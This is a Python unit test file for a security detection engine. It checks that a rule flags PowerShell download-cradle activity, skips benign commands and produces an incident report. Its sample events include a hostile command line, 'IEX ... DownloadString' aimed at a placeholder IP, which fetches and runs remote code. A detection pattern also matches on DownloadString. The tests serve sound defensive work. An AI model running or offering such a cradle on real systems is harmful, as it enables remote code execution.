import unittest
from pathlib import Path
from sentinel.core.models import SecurityEvent, DetectionRule
from sentinel.rules.engine import RuleEngine
from sentinel.triage.incident import IncidentTriageReport


class TestSentinelDetectionEngine(unittest.TestCase):

    def setUp(self):
        self.engine = RuleEngine()
        self.sample_rule = DetectionRule(
            id="test-sec-01",
            title="Test PowerShell Cradle",
            description="Unit test rule",
            severity="HIGH",
            mitre_tactics=["Execution"],
            mitre_techniques=["T1059.001"],
            logsource={"product": "windows"},
            selection={
                "image": "*powershell.exe",
                "command_line": "*DownloadString*",
            },
            containment_playbook=["Isolate host"],
        )
        self.engine.rules[self.sample_rule.id] = self.sample_rule

    def test_rule_matching_true_positive(self):
        event = SecurityEvent(
            event_id="e1",
            event_source="sysmon",
            data={
                "image": "C:\\Windows\\System32\\powershell.exe",
                "command_line": "powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.1')",
                "user": "test_user",
            },
        )
        alerts = self.engine.process_event(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].rule_id, "test-sec-01")
        self.assertIn("198.51.100.1", alerts[0].extracted_iocs["ips"])

    def test_rule_matching_false_positive_avoidance(self):
        event = SecurityEvent(
            event_id="e2",
            event_source="sysmon",
            data={
                "image": "C:\\Windows\\System32\\powershell.exe",
                "command_line": "powershell.exe Get-Process",
                "user": "test_user",
            },
        )
        alerts = self.engine.process_event(event)
        self.assertEqual(len(alerts), 0)

    def test_incident_dossier_formatting(self):
        event = SecurityEvent(
            event_id="e3",
            event_source="sysmon",
            data={
                "image": "powershell.exe",
                "command_line": "DownloadString http://203.0.113.5",
                "user": "admin",
                "computer_name": "DC-01",
            },
        )
        alerts = self.engine.process_event(event)
        dossier = IncidentTriageReport.generate_markdown_dossier(alerts[0])
        self.assertIn("SOC INCIDENT REPORT", dossier)
        self.assertIn("DC-01", dossier)
        self.assertIn("T1059.001", dossier)


if __name__ == "__main__":
    unittest.main()
